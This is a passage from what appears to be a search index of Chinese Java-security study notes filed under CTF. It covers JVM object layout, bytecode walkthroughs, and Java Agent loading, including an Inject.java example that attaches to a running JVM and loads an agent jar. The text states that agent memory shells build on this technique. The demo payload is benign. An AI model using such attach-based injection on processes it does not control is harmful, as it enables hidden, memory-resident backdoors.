<p>2.\u521d\u59cb\u5316\u5bf9\u8c61\uff1a\u7136\u540e\u6267\u884c\u5bf9\u8c61\u5185\u90e8\u751f\u6210\u7684init\u65b9\u6cd5\uff0c\u521d\u59cb\u5316\u6210\u5458\u53d8\u91cf\u503c\uff0c\u540c\u65f6\u6267\u884c\u641c\u96c6\u5230\u7684{}\u4ee3\u7801\u5757\u903b\u8f91\uff0c\u6700\u540e\u6267\u884c\u5bf9\u8c61\u6784\u9020\u65b9\u6cd5\uff08init \u65b9\u6cd5\u6267\u884c\u5b8c\u540eobjVariabl=88\uff0c\u6784\u9020\u65b9\u6cd5\u6267\u884c\u5b8c\u540eobjVariabl=99)\u3002</p> <p></p> <p>3.\u5f15\u7528\u5bf9\u8c61\uff1a\u5bf9\u8c61\u5b9e\u4f8b\u5316\u5b8c\u6bd5\u540e\uff0c\u518d\u628a\u6808\u4e2d\u7684Person\u5bf9\u8c61\u5f15\u7528\u5730\u5740\u6307\u5411Person\u5bf9\u8c61\u5728\u5806\u5185\u5b58\u4e2d\u7684\u5730\u5740\u3002</p> <p></p>"},{"location":"CTF/Java_Security/Article4/index.html#_7","title":"\u516d.\u5bf9\u8c61\u5728\u5185\u5b58\u7684\u5e03\u5c40","text":"<p>\u5bf9\u8c61\u521b\u5efa\u5b8c\u6210\u540e\u5728\u5185\u5b58\u4e2d\u4fdd\u5b58\u4e86\u4fdd\u5b58\u7684\u4fe1\u606f\u5305\u62ec\u5bf9\u8c61\u5934\u3001\u5b9e\u4f8b\u6570\u636e\u53ca\u5bf9\u9f50\u586b\u5145\u4e09\u7c7b\u4fe1\u606f\u3002</p>"},{"location":"CTF/Java_Security/Article4/index.html#_8","title":"\u5bf9\u8c61\u5934\uff1a","text":"<p>\u5bf9\u8c61\u5934\u91cc\u4e3b\u8981\u5305\u62ec\u51e0\u7c7b\u4fe1\u606f\uff0c\u5206\u522b\u662f\u9501\u72b6\u6001\u6807\u5fd7\u3001\u6301\u6709\u9501\u7684\u7ebf\u7a0bID\u3001GC\u5206\u4ee3\u5e74\u9f84\u3001\u5bf9\u8c61HashCode\uff0c\u7c7b\u5143\u4fe1\u606f\u5730\u5740\u3001\u6570\u7ec4\u957f\u5ea6\uff0c\u8fd9\u91cc\u5e76\u6ca1\u6709\u5bf9\u5bf9\u8c61\u5934\u91cc\u7684\u6bcf\u4e2a\u4fe1\u606f\u90fd\u5217\u51fa\u800c\u662f\u8fdb\u884c\u5927\u81f4\u7684\u5206\u7c7b\uff0c\u4e0b\u9762\u662f\u5bf9\u5176\u4e2d\u51e0\u7c7b\u4fe1\u606f\u8fdb\u884c\u8bf4\u660e\u3002</p> <p>\u9501\u72b6\u6001\u6807\u5fd7\uff1a\u5bf9\u8c61\u7684\u52a0\u9501\u72b6\u6001\u5206\u4e3a\u65e0\u9501\u3001\u504f\u5411\u9501\u3001\u8f7b\u91cf\u7ea7\u9501\u3001\u91cd\u91cf\u7ea7\u9501\u51e0\u79cd\u6807\u8bb0\u3002</p> <p>\u6301\u6709\u9501\u7684\u7ebf\u7a0b\uff1a \u6301\u6709\u5f53\u524d\u5bf9\u8c61\u9501\u5b9a\u7684\u7ebf\u7a0bID\u3002</p> <p>GC\u5206\u4ee3\u5e74\u9f84\uff1a \u5bf9\u8c61\u6bcf\u7ecf\u8fc7\u4e00\u6b21GC\u8fd8\u5b58\u6d3b\u4e0b\u6765\u4e86\uff0cGC\u5e74\u9f84\u5c31\u52a01\u3002</p> <p>\u7c7b\u5143\u4fe1\u606f\u5730\u5740\uff1a \u53ef\u901a\u8fc7\u5bf9\u8c61\u627e\u5230\u7c7b\u5143\u4fe1\u606f\uff0c\u7528\u4e8e\u5b9a\u4f4d\u5bf9\u8c61\u7c7b\u578b\u3002</p> <p>\u6570\u7ec4\u957f\u5ea6\uff1a \u5f53\u5bf9\u8c61\u662f\u6570\u7ec4\u7c7b\u578b\u7684\u65f6\u5019\u4f1a\u8bb0\u5f55\u6570\u7ec4\u7684\u957f\u5ea6\u3002</p>"},{"location":"CTF/Java_Security/Article4/index.html#_9","title":"\u5b9e\u4f8b\u6570\u636e","text":"<p>\u5bf9\u8c61\u5b9e\u4f8b\u6570\u636e\u624d\u662f\u5bf9\u8c61\u7684\u81ea\u8eab\u771f\u6b63\u7684\u6570\u636e\uff0c\u4e3b\u8981\u5305\u62ec\u81ea\u8eab\u7684\u6210\u5458\u53d8\u91cf\u4fe1\u606f\uff0c\u540c\u65f6\u8fd8\u5305\u62ec\u5b9e\u73b0\u7684\u63a5\u53e3\u3001\u7236\u7c7b\u7684\u6210\u5458\u53d8\u91cf\u4fe1\u606f\u3002</p>"},{"location":"CTF/Java_Security/Article4/index.html#_10","title":"\u5bf9\u9f50\u586b\u5145","text":"<p>\u6839\u636eJVM\u89c4\u8303\u5bf9\u8c61\u7533\u8bf7\u7684\u5185\u5b58\u5730\u5740\u5fc5\u987b\u662f8\u7684\u500d\u6570\uff0c\u6362\u53e5\u8bdd\u8bf4\u5bf9\u8c61\u5728\u7533\u8bf7\u5185\u5b58\u5927\u5c0f\u65f6\u50198\u5b57\u8282\u7684\u500d\u6570\uff0c\u5982\u679c\u5bf9\u8c61\u81ea\u8eab\u7684\u4fe1\u606f\u5927\u5c0f\u6ca1\u6709\u8fbe\u5230\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\uff0c\u90a3\u4e48\u8fd9\u90e8\u5206\u662f\u5bf9\u5269\u4f59\u90e8\u5206\u8fdb\u884c\u586b\u5145\u3002</p>"},{"location":"CTF/Java_Security/Article4/index.html#person","title":"Person\u5bf9\u8c61\u6700\u7ec8\u521b\u5efa\u5b8c\u6210\u540e\u5185\u5b58\u4e2d\u6570\u636e\u60c5\u51b5\u5927\u6982\u5982\u4e0b\u56fe\uff1a","text":""},{"location":"CTF/Java_Security/Article5/index.html","title":"JVM\u4e2d\u4ee3\u7801\u7684\u6267\u884c\u8fc7\u7a0b","text":"<p>\u73b0\u6709\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>public class Wei {\n  /**\n   * \u4e00\u4e2a\u65b9\u6cd5\u5bf9\u5e94\u4e00\u5757\u6808\u5e27\u5185\u5b58\u533a\u57df\n   */\n  public int methodA() {\n    int a = 10;\n    int b = 20;\n    int c = (a+b) *10;\n    return c;\n  }\n  public  static void main(String[] args) {\n    Wei wei = new Wei();\n    wei.methodA();\n  }\n}\n</code></pre> <p>\u90a3\u4e48JVM\u662f\u5982\u4f55\u6267\u884c\u8fd9\u4efd\u4ee3\u7801\u7684\uff1f\u6211\u4eec\u9996\u5148\u8981\u4e86\u89e3\u4e0bJVM\u7684\u5b8c\u6574\u7ed3\u6784\uff0c\u5982\u4e0b\u56fe\uff1a</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0cJVM\u662f\u7531\u4e09\u90e8\u5206\u7ec4\u6210\uff1a\u7c7b\u88c5\u8f7d\u5b50\u7cfb\u7edf\uff0cJVM\u8fd0\u884c\u65f6\u6570\u636e\u533a\u548c\u5b57\u8282\u7801\u6267\u884c\u5f15\u64ce\u3002\u5b83\u4eec\u4e09\u4e2a\u662f\u5982\u4f55\u5199\u4f5c\u5b8c\u6210\u4ee3\u7801\u7684\u6267\u884c\u7684\u5462\uff1f\u7b80\u5355\u6765\u8bf4\uff0c\u5206\u4e3a\u4e24\u6b65\uff1a</p> <p>1.\u901a\u8fc7\u7c7b\u88c5\u8f7d\u5b50\u7cfb\u7edf\u628aclass\u6587\u4ef6\u52a0\u8f7d\u5230JVM\u8fd0\u884c\u65f6\u6570\u636e\u533a\uff1b</p> <p>2.\u5b57\u8282\u7801\u6267\u884c\u5f15\u64ce\u6267\u884cJVM\u8fd0\u884c\u65f6\u6570\u636e\u533a\u7684\u6570\u636e\uff1b</p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u91cd\u70b9\u5173\u6ce8\u7b2c\u4e8c\u6b65\uff0c\u6211\u4eec\u77e5\u9053\uff0c\u5b57\u8282\u7801\u6587\u4ef6\u52a0\u8f7d\u5230JVM\u8fd0\u884c\u65f6\u6570\u636e\u533a\u540e\uff0c\u5f00\u59cb\u6267\u884cmain\u65b9\u6cd5\uff0c\u6211\u4eec\u4f7f\u7528\u4e00\u5f20\u56fe\u6765\u8bf4\u660emain\u7ebf\u7a0b\u7684\u6808\u7ed3\u6784\uff1a</p> <p></p> <p>main\u65b9\u6cd5\u6267\u884c\u7b2c\u4e00\u6b65\u65f6\uff0c\u4f1a\u5728\u5806\u4e0a\u751f\u6210\u5bf9\u8c61Wei\u7684\u5bf9\u8c61\u5b9e\u4f8b\uff0cmain\u65b9\u6cd5\u7684\u5c40\u90e8\u53d8\u91cf\u8868\u4e2d\u4fdd\u5b58\u7684\u662f\u8be5\u5bf9\u8c61\u5b9e\u4f8b\u5728\u5806\u4e2d\u7684\u5185\u5b58\u5730\u5740\uff0c\u5373\u5bf9\u8be5\u5bf9\u8c61\u7684\u5f15\u7528\u3002\u63a5\u7740\u6211\u4eec\u770b\u7b2c\u4e8c\u6b65\uff0c\u6267\u884cmethodA();</p> <p></p> <p>\u73b0\u5728\u6211\u4eec\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\uff0c\u53cd\u7f16\u8bd1\u4e0b\u5b57\u8282\u7801\u6587\u4ef6\uff0c\u547d\u4ee4\u548c\u5185\u5bb9\u5206\u522b\u5982\u4e0b\uff1a</p> <pre><code>PS C:\\Users\\86178\\Desktop\\project\\javaproject\\demo\\src&gt; javap -c .\\Wei.class &gt; wei.txt\n</code></pre> <pre><code>Compiled from \"Wei.java\"\npublic class Wei {\n  public Wei();\n    Code:\n       0: aload_0\n       1: invokespecial #1                  // Method java/lang/Object.\"&lt;init&gt;\":()V\n       4: return\n\n  public int methodA();\n    Code:\n    //\u5c06\u4e00\u4e2a8\u4f4d\u5e26\u7b26\u53f7\u6574\u6570\u538b\u5165\u6808\n       0: bipush        10\n    //\u5c06int\u7c7b\u578b\u503c\u5b58\u5165\u5c40\u90e8\u53d8\u91cf1(1\u4ee3\u8868\u5c40\u90e8\u53d8\u91cf\u8868\u7684\u4e0b\u6807\uff0c\u9ed8\u8ba4\u4e0b\u68070\u662fthis)\n       2: istore_1\n    //\u5c06\u4e00\u4e2a8\u4f4d\u5e26\u7b26\u53f7\u6574\u6570\u538b\u5165\u6808\n       3: bipush        20\n    //\u5c06int\u7c7b\u578b\u503c\u5b58\u5165\u5c40\u90e8\u53d8\u91cf2\n       5: istore_2\n    //\u4ece\u5c40\u90e8\u53d8\u91cf1\u4e2d\u88c5\u8f7dint\u7c7b\u578b\u503c\n       6: iload_1\n    //\u4ece\u5c40\u90e8\u53d8\u91cf2\u4e2d\u88c5\u8f7dint\u7c7b\u578b\u503c\n       7: iload_2\n    //\u6267\u884cint\u7c7b\u578b\u7684\u52a0\u6cd5\n       8: iadd\n    //\u5c06\u4e00\u4e2a8\u4f4d\u5e26\u7b26\u53f7\u6574\u6570\u538b\u5165\u6808\n       9: bipush        10\n    //\u6267\u884cint\u7c7b\u578b\u7684\u4e58\u6cd5\n      11: imul\n    //\u5c06int\u7c7b\u578b\u503c\u5b58\u5165\u5c40\u90e8\u53d8\u91cf3\n      12: istore_3\n    //\u4ece\u5c40\u90e8\u53d8\u91cf3\u4e2d\u88c5\u8f7dint\u7c7b\u578b\u503c\n      13: iload_3\n      14: ireturn\n\n  public static void main(java.lang.String[]);\n    Code:\n       0: new           #2                  // class Wei\n       3: dup\n       4: invokespecial #3                  // Method \"&lt;init&gt;\":()V\n       7: astore_1\n       8: aload_1\n       9: invokevirtual #4                  // Method methodA:()I\n      12: pop\n      13: return\n}\n</code></pre> <p>methodA()\u89e3\u91ca\uff1a</p> <p></p> <p></p> <p></p> <p>\u6267\u884c\u5b8c\u540e\uff0c\u5b8c\u6574\u7684\u5185\u5b58\u5173\u7cfb\u56fe\u5982\u4e0b\uff1a</p> <p></p> <p><code>methodA()</code>\u6267\u884c\u5b8c\u540e\uff0c\u901a\u8fc7\u6808\u5e27\u4e2d\u7684\u65b9\u6cd5\u51fa\u53e3\uff0c\u53ef\u4ee5\u5b9a\u4f4d\u5230<code>main()</code>\u4ee3\u7801\u7684\u6267\u884c\u4f4d\u7f6e\u3002<code>methodA()</code>\u6808\u5e27\u88ab\u5f39\u51fa<code>main</code>\u7ebf\u7a0b\u7684\u865a\u62df\u673a\u6808\u3002</p> <p><code>main()</code>\u65b9\u6cd5\u6267\u884c\u7ed3\u675f\uff0c<code>main()</code>\u6808\u5e27\u88ab\u5f39\u51fa<code>main</code>\u7ebf\u7a0b\u7684\u865a\u62df\u673a\u6808\u3002</p>"},{"location":"CTF/Java_Security/Article6/index.html","title":"AOP","text":"<p>JAVA\u4e2d\u5982\u4f55\u5b9e\u73b0AOP\uff1a</p> <p>\u5728 Java \u4e2d\u5b9e\u73b0 AOP\uff08\u9762\u5411\u5207\u9762\u7f16\u7a0b\uff09\u901a\u5e38\u4f7f\u7528\u7684\u6280\u672f\u662f\u52a8\u6001\u4ee3\u7406\u548c\u5b57\u8282\u7801\u589e\u5f3a\u3002\u8fd9\u4e24\u79cd\u6280\u672f\u90fd\u5141\u8bb8\u5f00\u53d1\u4eba\u5458\u5728\u8fd0\u884c\u65f6\u5bf9\u65b9\u6cd5\u7684\u8c03\u7528\u8fdb\u884c\u62e6\u622a\uff0c\u5e76\u5728\u65b9\u6cd5\u6267\u884c\u524d\u540e\u6267\u884c\u989d\u5916\u7684\u903b\u8f91\uff0c\u4ece\u800c\u5b9e\u73b0\u6a2a\u5207\u5173\u6ce8\u70b9\u7684\u529f\u80fd\u3002</p> <p>1.\u52a8\u6001\u4ee3\u7406\uff1aJava \u63d0\u4f9b\u4e86 java.lang.reflect.Proxy \u7c7b\u6765\u5b9e\u73b0\u52a8\u6001\u4ee3\u7406\u3002\u901a\u8fc7\u52a8\u6001\u4ee3\u7406\uff0c\u4f60\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u5b9e\u73b0\u4e86\u67d0\u4e2a\u63a5\u53e3\u7684\u4ee3\u7406\u5bf9\u8c61\uff0c\u5728\u4ee3\u7406\u5bf9\u8c61\u7684\u65b9\u6cd5\u8c03\u7528\u524d\u540e\u6267\u884c\u989d\u5916\u7684\u903b\u8f91\u3002\u901a\u5e38\uff0cAOP \u6846\u67b6\u4f1a\u4f7f\u7528\u52a8\u6001\u4ee3\u7406\u6765\u521b\u5efa\u4ee3\u7406\u5bf9\u8c61\uff0c\u7136\u540e\u5c06\u4ee3\u7406\u5bf9\u8c61\u7ec7\u5165\u5230\u76ee\u6807\u5bf9\u8c61\u7684\u8c03\u7528\u94fe\u4e2d\u3002</p> <p>2.\u5b57\u8282\u7801\u589e\u5f3a\uff1a\u5b57\u8282\u7801\u589e\u5f3a\u662f\u901a\u8fc7\u4fee\u6539\u76ee\u6807\u7c7b\u7684\u5b57\u8282\u7801\u6765\u5b9e\u73b0 AOP \u7684\u3002Java \u7684\u5b57\u8282\u7801\u53ef\u4ee5\u5728\u8fd0\u884c\u65f6\u88ab\u52a0\u8f7d\u3001\u4fee\u6539\u548c\u91cd\u65b0\u5b9a\u4e49\u3002\u56e0\u6b64\uff0cAOP \u6846\u67b6\u53ef\u4ee5\u901a\u8fc7\u5728\u76ee\u6807\u7c7b\u7684\u5b57\u8282\u7801\u4e2d\u63d2\u5165\u989d\u5916\u7684\u4ee3\u7801\u6765\u5b9e\u73b0\u65b9\u6cd5\u62e6\u622a\u548c\u6a2a\u5207\u903b\u8f91\u3002\u5e38\u89c1\u7684\u5b57\u8282\u7801\u589e\u5f3a\u5de5\u5177\u5305\u62ec <code>ASM</code>\u3001<code>CGLIB</code> \u548c <code>ByteBuddy</code> \u7b49\u3002</p> <p>\u4e00\u822c\u6765\u8bf4\uff0cAOP \u6846\u67b6\u4f1a\u7ed3\u5408\u8fd9\u4e24\u79cd\u6280\u672f\u6765\u5b9e\u73b0 AOP \u529f\u80fd\u3002\u4f8b\u5982\uff0cSpring Framework \u4e2d\u7684 AOP \u6a21\u5757\u4f7f\u7528\u52a8\u6001\u4ee3\u7406\u6765\u5b9e\u73b0\u57fa\u4e8e\u63a5\u53e3\u7684\u4ee3\u7406\uff0c\u800c\u5bf9\u4e8e\u6ca1\u6709\u63a5\u53e3\u7684\u7c7b\uff0c\u5219\u4f7f\u7528\u5b57\u8282\u7801\u589e\u5f3a\u6765\u751f\u6210\u5b50\u7c7b\uff0c\u5e76\u5728\u5b50\u7c7b\u4e2d\u6dfb\u52a0\u6a2a\u5207\u903b\u8f91\u3002</p> <p>AOP\u4e3a<code>Aspect Oriented Programming</code>\u7684\u7f29\u5199\uff0c\u610f\u4e3a: \u9762\u5411\u5207\u9762\u7f16\u7a0b\u3002\u5728\u8fd0\u884c\u65f6\uff0c\u52a8\u6001\u5730\u5c06\u4ee3\u7801\u5207\u5165\u5230\u7c7b\u7684\u6307\u5b9a\u65b9\u6cd5\u3001\u6307\u5b9a\u4f4d\u7f6e\u4e0a\u7684\u7f16\u7a0b\u601d\u60f3\u5c31\u662f\u9762\u5411\u5207\u9762\u7684\u7f16\u7a0b\u3002</p> <p>JDK 1.5 \u5f00\u59cb\uff0cJava\u65b0\u589e\u4e86Instrumentation(Java Agent API)\u548cJVMTI(JVM Tool Interface)\u529f\u80fd\uff0c\u5141\u8bb8JVM\u5728\u52a0\u8f7d\u67d0\u4e2aclass\u6587\u4ef6\u4e4b\u524d\u5bf9\u5176\u5b57\u8282\u7801\u8fdb\u884c\u4fee\u6539\uff0c\u540c\u65f6\u4e5f\u652f\u6301\u5bf9\u5df2\u52a0\u8f7d\u7684class(\u7c7b\u5b57\u8282\u7801)\u8fdb\u884c\u91cd\u65b0\u52a0\u8f7d(Retransform)\u3002</p> <p>\u5f00\u53d1\u8005\u53ef\u4ee5\u5728\u4e00\u4e2a\u666e\u901aJava\u7a0b\u5e8f\uff08\u5e26\u6709main\u51fd\u6570\u7684Java\u7c7b\uff09\u8fd0\u884c\u65f6\uff0c\u901a\u8fc7<code>\u2013javaagent</code>\u53c2\u6570\u6307\u5b9a\u4e00\u4e2a\u7279\u5b9a\u7684jar\u6587\u4ef6(\u5305\u542b<code>Instrumentation</code>\u4ee3\u7406)\u6765\u542f\u52a8<code>Instrumentation</code>\u7684\u4ee3\u7406\u7a0b\u5e8f\u3002\u5728\u7c7b\u7684\u5b57\u8282\u7801\u8f7d\u5165<code>jvm</code>\u524d\u4f1a\u8c03\u7528<code>ClassFileTransformer</code>\u7684<code>transform</code>\u65b9\u6cd5\uff0c\u4ece\u800c\u5b9e\u73b0\u4fee\u6539\u539f\u7c7b\u65b9\u6cd5\u7684\u529f\u80fd\uff0c\u5b9e\u73b0AOP\u3002</p> <p>\u901a\u8fc7java.lang.instrument\u5b9e\u73b0\u7684\u5de5\u5177\u6211\u4eec\u79f0\u4e4b\u4e3aJava Agent\uff0cJava Agent\u80fd\u591f\u5728\u4e0d\u5f71\u54cd\u6b63\u5e38\u7f16\u8bd1\u7684\u60c5\u51b5\u4e0b\u6765\u4fee\u6539\u5b57\u8282\u7801\uff0c\u5373\u52a8\u6001\u4fee\u6539\u5df2\u52a0\u8f7d\u6216\u8005\u672a\u52a0\u8f7d\u7684\u7c7b\uff0c\u5305\u62ec\u7c7b\u7684\u5c5e\u6027\u3001\u65b9\u6cd5\uff0cAgent\u5185\u5b58\u9a6c\u7684\u5b9e\u73b0\u5c31\u662f\u5229\u7528\u4e86\u8fd9\u4e00\u7279\u6027\u4f7f\u5176\u52a8\u6001\u4fee\u6539\u7279\u5b9a\u7c7b\u7684\u7279\u5b9a\u65b9\u6cd5\uff0c\u5c06\u6211\u4eec\u7684\u6076\u610f\u65b9\u6cd5\u6dfb\u52a0\u8fdb\u53bb\u3002</p> <p>\u8bf4\u767d\u4e86Java Agent\u53ea\u662f\u4e00\u4e2aJava\u7c7b\u800c\u5df2\uff0c\u53ea\u4e0d\u8fc7\u666e\u901a\u7684Java\u7c7b\u662f\u4ee5main\u51fd\u6570\u4f5c\u4e3a\u5165\u53e3\u70b9\u7684\uff0cJava Agent\u7684\u5165\u53e3\u70b9\u5219\u662f<code>premain</code>\u548c<code>agentmain</code></p> <p>Java Agent \u652f\u6301\u4e24\u79cd\u65b9\u5f0f\u8fdb\u884c\u52a0\u8f7d\uff1a</p> <ul> <li>\u5b9e\u73b0 premain \u65b9\u6cd5\uff0c\u5728\u542f\u52a8\u65f6\u8fdb\u884c\u52a0\u8f7d \uff08\u8be5\u7279\u6027\u5728 jdk 1.5 \u4e4b\u540e\u624d\u6709\uff09</li> <li>\u5b9e\u73b0 agentmain \u65b9\u6cd5\uff0c\u5728\u542f\u52a8\u540e\u8fdb\u884c\u52a0\u8f7d \uff08\u8be5\u7279\u6027\u5728 jdk 1.6 \u4e4b\u540e\u624d\u6709\uff09</li> </ul>"},{"location":"CTF/Java_Security/Article6/index.html#premain","title":"premain","text":"<p>\u9996\u5148\u521b\u5efa\u4e00\u4e2apremain\u7684agent:</p> <pre><code>import java.lang.instrument.Instrumentation;\n\npublic class DemoTest {\n  public static void premain(String agentArgs, Instrumentation inst) throws Exception{\n    System.out.println(agentArgs);\n    for(int i=0;i&lt;5;i++){\n      System.out.println(\"premain method is invoked!\");\n    }\n  }\n}\n</code></pre> <p>\u7136\u540e\u901a\u8fc7mvn\u6216\u8005mf\u6587\u4ef6\u6253\u751f\u6210jar\u5305\uff1a</p> <pre><code>Manifest-Version: 1.0\nPremain-Class: DemoTest\n</code></pre> <p>\u5229\u7528javac\u751f\u6210class\u6587\u4ef6\u4e4b\u540e\u6253\u5305\uff1a<code>jar cvfm agent.jar agent.mf DemoTest.class</code></p> <p>\u7136\u540e\u518d\u521b\u5efa\u4e00\u4e2a\u666e\u901a\u7684\u7c7bHello.java\u548cmf\u6587\u4ef6:</p> <pre><code>public class Hello {\n    public static void main(String[] args) {\n        System.out.println(\"Hello,Java\");\n    }\n}\n</code></pre> <p>mf\u6587\u4ef6:</p> <pre><code>Manifest-Version: 1.0\nMain-Class: Hello\n</code></pre> <p>\u540c\u6837\u6253\u5305\u4e3ajar: <code>jar cvfm hello.jar hello.mf Hello.class</code></p> <p>\u63a5\u4e0b\u6765\u8fd0\u884c\u7684\u65f6\u5019\u589e\u52a0-javaagent:agent.jar: <code>java -javaagent:agent.jar=Hello -jar hello.jar</code></p> <p></p> <p></p>"},{"location":"CTF/Java_Security/Article6/index.html#agentmain","title":"agentmain","text":""},{"location":"CTF/Java_Security/Article6/index.html#appjava","title":"App.java","text":"<p>\u5faa\u73af\u8f93\u51fa\uff0c\u6a21\u62df\u8fd0\u884c\u7684\u5e94\u7528</p> <pre><code>package agentmain;\n\nimport java.lang.management.ManagementFactory;\n\npublic class App {\n  public static void main(String[] args) throws InterruptedException {\n    while (true){\n      String name = ManagementFactory.getRuntimeMXBean().getName();\n      String pid = name.split(\"@\")[0];\n      System.out.println(\"Pid is:\" + pid);\n      for(int i=0;i&lt;500;i++){\n        System.out.println(\"App is Running!\");\n        Thread.sleep(2000);\n      }\n    }\n  }\n}\n</code></pre>"},{"location":"CTF/Java_Security/Article6/index.html#agentdemojava","title":"AgentDemo.java","text":"<p>\u5b9e\u73b0agentmain\u529f\u80fd\uff0c\u7528\u4e8eagent\u7684\u529f\u80fd\u5b9e\u73b0</p> <pre><code>package agentmain;\n\nimport java.lang.instrument.Instrumentation;\n\npublic class AgentDemo {\n  public static void agentmain(String agentArgs, Instrumentation inst){\n    System.out.println(\"Surprise! I'm Agent Smith\");\n  }\n}\n</code></pre>"},{"location":"CTF/Java_Security/Article6/index.html#injectjava","title":"Inject.java","text":"<p>\u901a\u8fc7VirtualMachine\u7684loadAgent\u65b9\u5f0f\uff0c\u628aAgent\u6ce8\u5165\u6b63\u5728\u8fd0\u884c\u7684App\u91cc\uff1a</p> <pre><code>package agentmain;\n\nimport com.sun.tools.attach.VirtualMachine;\n\npublic class Inject {\n  public static void main(String[] args) throws Exception {\n    String pid = args[0];\n    String jarName = args[1];\n\n    VirtualMachine vm = VirtualMachine.attach(pid);\n    vm.loadAgent(jarName);\n    vm.detach();\n  }\n}\n</code></pre> <p>\u4ee5\u4e0a\u4e09\u4e2ajava\u6587\u4ef6\u901a\u8fc7IDEA\u6253\u5305\u4e3aJar\u6587\u4ef6\uff0c\u9996\u5148\u8fd0\u884cApp.jar\uff1a</p> <pre><code>java -cp JavaAgentDemo.jar agentmain.demo1.App\n</code></pre> <p>\u7136\u540e\u4f7f\u7528Inject.jar\u6ce8\u5165\u8fdb\u7a0b</p> <pre><code>java -cp JavaAgentDemo.jar agentmain.demo1.Inject 22932 /var/tmp/AgentDemo.jar\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230App.jar\u7684\u8f93\u51fa\u88ab\u52a8\u6001\u7684\u6539\u53d8\u4e86\uff1a</p> <p></p>"},{"location":"CTF/Java_Security/Article7/index.html","title":"Java Native Interface","text":"<p>JNI\u662fJava Native Interface\u7684\u7f29\u5199\uff0c\u4e2d\u6587\u8bd1\u4e3a\u201cJava\u672c\u5730\u63a5\u53e3\u201d\u3002\u901a\u4fd7\u5730\u8bf4\uff0cJNI\u662f\u4e00\u79cd\u6280\u672f\uff0c\u901a\u8fc7\u8fd9\u79cd\u6280\u672f\u53ef\u4ee5\u505a\u5230\u4ee5\u4e0b\u4e24\u70b9\uff1a</p> <ol> <li>Java\u7a0b\u5e8f\u4e2d\u7684\u51fd\u6570\u53ef\u4ee5\u8c03\u7528Native\u8bed\u8a00\u5199\u7684\u51fd\u6570\uff0cNative\u4e00\u822c\u6307\u7684\u662fC/C++\u7f16\u5199\u7684\u51fd\u6570\u3002</li> <li>Native\u7a0b\u5e8f\u4e2d\u7684\u51fd\u6570\u53ef\u4ee5\u8c03\u7528Java\u5c42\u7684\u51fd\u6570\uff0c\u4e5f\u5c31\u662f\u8bf4\u5728C/C++\u7a0b\u5e8f\u4e2d\u53ef\u4ee5\u8c03\u7528Java\u7684\u51fd\u6570\u3002 \u4e5f\u5c31\u662fJava\u4e0eC/C++\u4ee3\u7801\u4e92\u76f8\u8c03\u7528</li> </ol> <p>\u5728\u5e73\u53f0\u65e0\u5173\u7684Java\u4e2d\uff0c\u4e3a\u4ec0\u4e48\u8981\u521b\u5efa\u4e00\u4e2a\u4e0eNative\u76f8\u5173\u7684JNI\u6280\u672f\u5462\uff1f\u8fd9\u5c82\u4e0d\u662f\u7834\u574f\u4e86Java\u7684\u5e73\u53f0\u65e0\u5173\u7279\u6027\u5417\uff1fJNI\u6280\u672f\u7684\u63a8\u51fa\u6709\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\u7684\u8003\u8651\uff1a</p> <ol> <li>\u627f\u8f7dJava\u4e16\u754c\u7684\u865a\u62df\u673a\u662f\u7528Native\u8bed\u8a00\u5199\u7684\uff0c\u800c\u865a\u62df\u673a\u53c8\u8fd0\u884c\u5728\u5177\u4f53\u7684\u5e73\u53f0\u4e0a\uff0c\u6240\u4ee5\u865a\u62df\u673a\u672c\u8eab\u65e0\u6cd5\u505a\u5230\u5e73\u53f0\u65e0\u5173\u3002\u7136\u800c\uff0c\u6709\u4e86JNI\u6280\u672f\u540e\u5c31\u53ef\u4ee5\u5bf9Java\u5c42\u5c4f\u853d\u4e0d\u540c\u64cd\u4f5c\u7cfb\u7edf\u5e73\u53f0\uff08\u5982Windows\u548cLinux\uff09\u4e4b\u95f4\u7684\u5dee\u5f02\u4e86\uff08\u4f8b\u5982\u540c\u6837\u662f\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\uff0cWindows\u4e0a\u7684API\u4f7f\u7528OpenFile\u51fd\u6570\uff0c\u800cLinux\u4e0a\u7684API\u662fopen\u51fd\u6570\uff09\u3002\u8fd9\u6837\uff0c\u5c31\u80fd\u5b9e\u73b0Java\u672c\u8eab\u7684\u5e73\u53f0\u65e0\u5173\u7279\u6027\u3002\u5176\u5b9eJava\u4e00\u76f4\u5728\u4f7f\u7528JNI\u6280\u672f\uff0c\u53ea\u662f\u6211\u4eec\u5e73\u65f6\u8f83\u5c11\u7528\u5230\u7f62\u4e86\u3002</li> <li>\u65e9\u5728Java\u8bed\u8a00\u8bde\u751f\u524d\uff0c\u5f88\u591a\u7a0b\u5e8f\u90fd\u662f\u7528C/C++\u8bed\u8a00\u5199\u7684\uff0c\u5b83\u4eec\u904d\u5e03\u5728\u8f6f\u4ef6\u4e16\u754c\u7684\u5404\u4e2a\u89d2\u843d\u3002Java\u51fa\u4e16\u540e\uff0c\u5b83\u53d7\u5230\u4e86\u8ffd\u6367\uff0c\u5e76\u8fc5\u901f\u5f97\u5230\u53d1\u5c55\uff0c\u4f46\u4ecd\u65e0\u6cd5\u5c06\u8f6f\u4ef6\u4e16\u754c\u5f7b\u5e95\u6539\u671d\u6362\u4ee3\uff0c\u4e8e\u662f\u624d\u6709\u4e86\u6298\u4e2d\u7684\u529e\u6cd5\u3002\u65e2\u7136\u5df2\u7ecf\u6709C/C++\u6a21\u5757\u5b9e\u73b0\u4e86\u76f8\u5173\u529f\u80fd\uff0c\u90a3\u4e48\u5728Java\u4e2d\u901a\u8fc7JNI\u6280\u672f\u76f4\u63a5\u4f7f\u7528\u5b83\u4eec\u5c31\u884c\u4e86\uff0c\u514d\u5f97\u843d\u4e0b\u91cd\u590d\u5236\u9020\u8f6e\u5b50\u7684\u574f\u540d\u58f0\u3002\u53e6\u5916\uff0c\u5728\u4e00\u4e9b\u8981\u6c42\u6548\u7387\u548c\u901f\u5ea6\u7684\u573a\u5408\u8fd8\u662f\u9700\u8981C/C++\u8bed\u8a00\u53c2\u4e0e\u7684\u3002</li> 